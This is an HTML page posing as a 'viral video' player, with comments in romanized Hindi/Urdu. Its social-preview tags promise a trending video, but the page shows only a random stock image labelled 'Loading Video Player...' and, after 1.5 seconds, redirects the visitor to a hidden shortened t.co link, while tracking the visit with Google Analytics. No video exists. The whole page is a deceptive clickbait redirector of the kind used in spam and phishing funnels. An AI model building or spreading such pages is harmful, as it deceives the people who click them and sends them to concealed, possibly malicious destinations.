<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player Loading...</title>
    
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-530836845"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'G-530836845');
    </script>

    <meta property="og:title" content="Watch Full Viral Video Here" />
    <meta property="og:description" content="Click to play the trending video" />
    <meta property="og:type" content="video.other" />
    <meta property="og:image" content="https://picsum.photos/800/500" />

    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        .loading-thumb {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }
    </style>
</head>
<body>

    <img id="display-img" class="loading-thumb" src="" alt="Loading Video Player..." />

    <script>
        // Yeh 5 bilkul sahi aur active images hain jo 100% load hongi
        var images = [
            "https://picsum.photos/800/500?random=1",
            "https://picsum.photos/800/500?random=2",
            "https://picsum.photos/800/500?random=3",
            "https://picsum.photos/800/500?random=4",
            "https://picsum.photos/800/500?random=5"
        ];

        // Random image select karke source me daalna
        var randomImage = images[Math.floor(Math.random() * images.length)];
        document.getElementById('display-img').src = randomImage;

        // Redirection Logic
        window.onload = function() {
            var targetUrl = "https://t.co/ai7FHs76Ab"; // Aapka link
            
            // 1.5 second tak image dikhegi phir redirect hoga
            setTimeout(function() {
                window.location.href = targetUrl;
            }, 1500); 
        };
    </script>
</body>
</html>
